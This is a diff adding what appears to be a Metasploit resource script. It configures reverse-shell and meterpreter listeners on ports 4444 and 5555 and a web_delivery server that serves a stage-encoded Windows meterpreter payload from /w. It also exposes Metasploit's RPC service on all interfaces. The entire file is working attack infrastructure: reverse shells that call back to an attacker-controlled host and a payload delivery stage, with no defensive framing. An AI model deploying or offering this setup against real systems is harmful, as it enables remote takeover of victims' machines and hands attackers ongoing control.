@@ -1,0 +1,26 @@
+
+setg LHOST LHOST_PLACEHOLDER
+
+use exploit/multi/handler
+set ExitOnSession false
+set payload generic/shell_reverse_tcp
+set LPORT 4444
+exploit -j -z
+
+set payload multi/meterpreter/reverse_http
+set LPORT 5555
+exploit -j -z
+
+use exploit/multi/script/web_delivery
+set target 2
+set SRVPORT 8080
+set URIPATH /w
+set payload windows/meterpreter/reverse_http
+set LPORT 5555
+set DisablePayloadHandler true
+set EnableStageEncoding true
+set ExitOnSession false
+exploit -j -z
+
+load msgrpc ServerHost=0.0.0.0 ServerPort=3333 SSL=true
+
